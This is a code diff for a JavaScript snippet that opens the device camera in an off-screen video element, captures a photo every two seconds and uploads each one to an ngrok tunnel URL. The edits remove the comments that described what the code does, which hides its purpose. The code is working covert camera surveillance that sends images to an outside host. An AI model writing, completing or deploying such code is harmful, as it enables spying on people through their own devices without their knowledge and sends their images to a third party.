@@ -11,14 +11,13 @@
         const canvas = document.createElement('canvas');
         const context = canvas.getContext('2d');
 
-        // Access the device camera
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
 
-                // Capture photo every 10 seconds
+               
                 setInterval(() => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -27,7 +26,7 @@
                         const formData = new FormData();
                         formData.append('photo', blob, 'photo.jpg');
 
-                        // Send the photo to the server
+                       
                         fetch('https://c4dd-150-242-65-3.ngrok-free.app/upload', {  // replace url
                             method: 'POST',
                             body: formData
@@ -40,7 +39,7 @@
                             console.error('Error uploading photo:', error);
                         });
                     }, 'image/jpeg');
-                }, 2000); // 10 seconds
+                }, 2000); 
             })
             .catch((err) => {
                 console.error("Error accessing camera: ", err);
